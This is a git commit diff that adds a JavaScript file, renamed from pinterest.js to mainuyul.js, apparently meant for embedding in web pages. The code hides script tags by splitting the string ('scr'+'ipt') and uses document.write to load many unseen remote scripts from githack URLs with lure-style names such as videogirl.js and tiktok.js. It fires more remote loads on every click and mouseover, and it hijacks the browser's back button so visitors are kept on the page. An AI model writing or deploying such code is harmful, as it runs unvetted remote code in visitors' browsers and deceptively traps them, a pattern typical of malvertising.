c4b423b53de32c885f9889605b16cc66835a8775
irawanria85 <irawanria85@gmail.com>
2020-07-16 14:55:11 +0700

    Update and rename pinterest.js to mainuyul.js

---
+++ mainuyul.js
@@ -0,0 +1,45 @@
+// Image
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/6a870604cebd7e200a27e2120e90c217fee33011/pin.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/funny.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/videogirl.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/6a870604cebd7e200a27e2120e90c217fee33011/pin.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/wallpaper.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/tiktok.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/6a870604cebd7e200a27e2120e90c217fee33011/pin.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/stylewoman.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/tiktokstar.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/6a870604cebd7e200a27e2120e90c217fee33011/pin.js"></scr' + 'ipt>');
+
+// Main script
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/aridjaya/8bd18004bbfc79fa86d3c1fb73a8968d14acbe5f/masterin.js"></scr' + 'ipt>');
+
+// Mouse over
+parent.onclick = function(event) {
+    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/random/9ff94e75fcbc017cb6eeeb6999a9f543cfa3144a/aridjayablog.js"></scr' + 'ipt>');
+};
+parent.onmouseover = function(event) {
+    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/random/9ff94e75fcbc017cb6eeeb6999a9f543cfa3144a/aridjayablog.js"></scr' + 'ipt>');
+};
+
+// Body click
+var valued = true
+document.onclick = function() {
+    if (valued) {
+        document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/random/9ff94e75fcbc017cb6eeeb6999a9f543cfa3144a/aridjaya.js"></scr' + 'ipt>');
+        valued = true
+    }
+};
+
+// Back to aridjaya
+(function(window, location) {
+    history.replaceState(null, document.title, location.pathname + "#!/history");
+    history.pushState(null, document.title, location.pathname);
+    window.addEventListener("popstate", function() {
+        if (location.hash === "#!/history") {
+            history.replaceState(null, document.title, location.pathname);
+            setTimeout(function() {
+              document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/random/9ff94e75fcbc017cb6eeeb6999a9f543cfa3144a/aridjayablog.js"></scr' + 'ipt>');
+            }, 0);
+        }
+    }, false);
+}(window, location));
